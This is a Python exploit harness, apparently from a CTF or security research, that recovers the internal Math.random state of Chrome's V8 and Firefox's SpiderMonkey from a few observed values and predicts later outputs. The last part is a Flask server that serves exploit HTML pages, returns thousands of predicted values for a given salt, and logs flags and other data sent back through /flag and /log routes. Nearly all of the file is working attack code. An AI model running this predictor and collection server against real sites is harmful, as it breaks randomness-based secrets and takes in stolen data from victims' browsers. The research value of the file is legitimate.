# Copyright 2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import z3
import struct
import numpy
from math import nextafter, inf

def base36_to_double(n):
  """
    Inverts (num).toString(36).slice(2) from JavaScript to get `num`.

    Example:
    >>> base36_to_double("dv7xjxbdnm6")
    0.38520087536951264
    >>> base36_to_double("z")
    0.9722222222222222
  """
  return int(n, 36) / 36**len(n)


# Chrome predictor
# Based on https://github.com/kalmarunionenctf/kalmarctf/blob/main/2025/web/spukhafte/solution/solve.py
# With adjustemnts to account for a recent change:
#   - https://source.chromium.org/chromium/_/chromium/v8/v8/+/e0609ce60acf83df5c6ecd8f1e02f771e9fc6538

MASK = 0xffffffffffffffff

def init_state():
    mtx = [[0]*i + [1] + [0]*(127-i) for i in range(128)]
    return mtx[:64], mtx[64:]

def shl_sym(mtx, n):
    return mtx[n:] + [[0]*128]*n

def shr_sym(mtx, n):
    return [[0]*128]*n + mtx[:-n]

def xor_sym(a, b):
    return [[aaa^bbb for aaa, bbb in zip(aa, bb)] for aa, bb in zip(a, b)]

def xs128p_sym(old_s0, old_s1):
    s1, s0 = old_s0, old_s1
    s1 = xor_sym(s1, shl_sym(s1, 23))
    s1 = xor_sym(s1, shr_sym(s1, 17))
    s1 = xor_sym(s1, s0)
    s1 = xor_sym(s1, shr_sym(s0, 26))
    return s1

def xs128p(old_s0, old_s1):
    s1, s0 = old_s0, old_s1
    s1 ^= (s1 << 23) & MASK
    s1 ^= (s1 >> 17)
    s1 ^= s0
    s1 ^= (s0 >> 26)
    return s1

def mh(h):
    h ^= h >> 33
    h = (h * 0xFF51AFD7ED558CCD) & MASK
    h ^= h >> 33
    h = (h * 0xC4CEB9FE1A85EC53) & MASK
    h ^= h >> 33
    return h

def mh_inv(h):
    h ^= h >> 33
    h = (h * 0x9cb4b2f8129337db) & MASK
    h ^= h >> 33
    h = (h * 0x4f74430c22a54005) & MASK
    h ^= h >> 33
    return h

def bits_to_int(bits: list[bool]) -> int:
    return int("".join(map(str, map(int, bits))), 2)

def int_to_bits(n, length):
    return [((n >> (length - i - 1)) & 1) for i in range(length)]

def reverse17(val):
    return val ^ (val >> 17) ^ (val >> 34) ^ (val >> 51)

def reverse23(val):
    return (val ^ (val << 23) ^ (val << 46)) & MASK

def xs128p_backward(s0, s1):
    prev_s0 = s1 ^ (s0 >> 26)
    prev_s0 = prev_s0 ^ s0
    prev_s0 = reverse17(prev_s0)
    prev_s0 = reverse23(prev_s0)
    return prev_s0

def state_to_double(s0: int) -> float:
    return float(s0 >> 11) / (1 << 53)

def get_mantissa(val: float) -> int:
    a = int(val * 2**53)
    return a & 0x001F_FFFF_FFFF_FFFF

def validate_solution_v8(s0, s1, count=128):
    for _ in range(count):
        if mh(s0^MASK) == s1:
            return mh_inv(s0)
        s0, s1 = xs128p_backward(s0, s1), s0

def validate_solution_mr(s0, s1, count=128):
    for _ in range(count):
        if mh_inv(s0) == mh_inv(s1)^MASK:
            return mh_inv(s0)
        s0, s1 = xs128p_backward(s0, s1), s0

def solve_basic_state(A, b):
    from sage.all import matrix, vector, GF
    F = GF(2)
    mtx = matrix(F, A)
    vec = vector(F, b)

    sol = mtx.solve_right(vec)
    return bits_to_int(sol[:64]), bits_to_int(sol[64:])

def solve_math_random(numbers):
    s0, s1 = init_state()

    A = []
    b = []
    for n in numbers[::-1]:
        A += s0[:53]
        b += int_to_bits(get_mantissa(n), 53)
        s0, s1 = s1, xs128p_sym(s0, s1)

    s0, s1 = solve_basic_state(A, b)
    return validate_solution_mr(s0, s1)

def iter_math_random(seed):
    s0, s1 = mh(seed), mh(seed^MASK)
    while True:
        block = []
        for _ in range(64):
            s0, s1 = s1, xs128p(s0, s1)
            block.append(state_to_double(s0))
        yield from block[::-1]

def test_chrome_predict():
  # A few random numbers generated by Chrome. The predictor should be
  # able to calculate the last number, given the previous ones.
  TEST_CASE = [0.32284380995926687, 0.35892538730903745, 0.2015652930688271, 0.7344003713130659, 0.49034320661854625]

  seed = solve_math_random(TEST_CASE[:-1])
  iter = iter_math_random(seed)
  preds = [next(iter) for i in range(0,5)]

  assert preds[-1] == TEST_CASE[-1], f"{preds[-1]} != {TEST_CASE[-1]}"

test_chrome_predict()

# Firefox predictor based on:
#  - https://github.com/mkutay/spidermonkey-randomness-predictor/blob/main/main.py

def solve_math_random_ff(sequence):
  solver = z3.Solver()

  se_state0, se_state1 = z3.BitVecs("se_state0 se_state1", 64)

  for i in range(len(sequence)):
    se_s1 = se_state0
    se_s0 = se_state1
    se_s1 ^= se_s1 << 23
    se_s1 ^= z3.LShR(se_s1, 17)
    se_s1 ^= se_s0
    se_s1 ^= z3.LShR(se_s0, 26)
    se_state0 = se_state1
    se_state1 = se_s1
    calc = se_state1 + se_state0

    mantissa = sequence[i] * (0x1 << 53)

    solver.add(int(mantissa) == (calc & 0x1FFFFFFFFFFFFF))

  if solver.check() == z3.sat:
    model = solver.model()

    states = {}
    for state in model.decls():
      states[state.__str__()] = model[state]

    return states["se_state0"].as_long(), states["se_state1"].as_long()

def iter_math_random_ff(state0, state1):
  MASK = 0xFFFFFFFFFFFFFFFF

  while True:
    s1 = state0 & MASK
    s0 = state1 & MASK
    s1 ^= (s1 << 23) & MASK
    s1 ^= (s1 >> 17) & MASK
    s1 ^= s0 & MASK
    s1 ^= (s0 >> 26) & MASK
    state0 = state1 & MASK
    state1 = s1 & MASK
    gen = (state0 + state1) & MASK

    yield float(gen & 0x1FFFFFFFFFFFFF) / (0x1 << 53)


def test_firefox_predict():
  # A few random numbers generated by Firefox. The predictor should be
  # able to calculate the last number, given the previous ones.
  TEST_CASE = [
    0.8431670449485892,
    0.43385289233085145,
    0.7674771743931095,
    0.9826449278522053,
    0.867667470753005
  ]

  state0, state1 = solve_math_random_ff(TEST_CASE[:-1])
  iter = iter_math_random_ff(state0, state1)
  preds = [next(iter) for i in range(0,5)]

  assert preds[-1] == TEST_CASE[-1], f"{preds[-1]} != {TEST_CASE[-1]}"

test_firefox_predict()

import itertools

def chunks(s, lengths):
  start = 0
  i = 0
  while True:
    if i >= len(lengths):
      l = len(s)
    else:
      l = lengths[i]
    chunk = s[start:start+l]
    i += 1
    start += l
    if chunk == '':
      return
    yield chunk

def chrome_predict_salt(salt, n=5):
  for lens in itertools.product([11, 10, 12, 9], repeat=5):
    if sum(lens) != len(salt): continue
    nums = list(chunks(salt, lens))
    nums = [base36_to_double(n) for n in nums]
    # print(nums)
    try:
      seed = solve_math_random(nums)
      iter = iter_math_random(seed)
      return [next(iter) for i in range(0,n+5)]
    except:
      pass

def firefox_predict_salt(salt, n=5):
  for lens in itertools.product([11, 10, 12, 9], repeat=5):
    if sum(lens) != len(salt): continue
    nums = list(chunks(salt, lens))
    nums = [base36_to_double(n) for n in nums]
    # print(nums)
    try:
      state0, state1 = solve_math_random_ff(nums)
      iter = iter_math_random_ff(state0, state1)
      return [next(iter) for i in range(0,n+5)]
    except:
      pass


from flask import Flask, send_file
import time

app = Flask(__name__)

@app.route("/")
def hello():
  return "Hello"

@app.route("/sleep/<int:ms>")
def sleep(ms):
  time.sleep(ms/1000)
  return "sleep"

@app.route("/exploit-eolldodkgm9")
def exploit():
  return send_file('exploit-chrome.html')


@app.route("/exploit-ff-eolldodkgm9")
def exploitff():
  return send_file('exploit-firefox.html')


@app.route("/predict/<salt>")
def predict(salt):
  predictions = chrome_predict_salt(salt, 5000) or []
  return predictions

@app.route("/predict-ff/<salt>")
def predict_ff(salt):
  predictions = firefox_predict_salt(salt, 5000) or []
  return predictions

@app.route("/test")
def test():
  return send_file('test-random.html')

@app.route("/flag/<flag>")
def say_flag(flag):
  print(flag)
  return "Hello"

@app.route("/log/<l>")
def log(l):
  print(l)
  return "Hello"

if __name__ == '__main__':
   app.run(host='0.0.0.0', port='80')
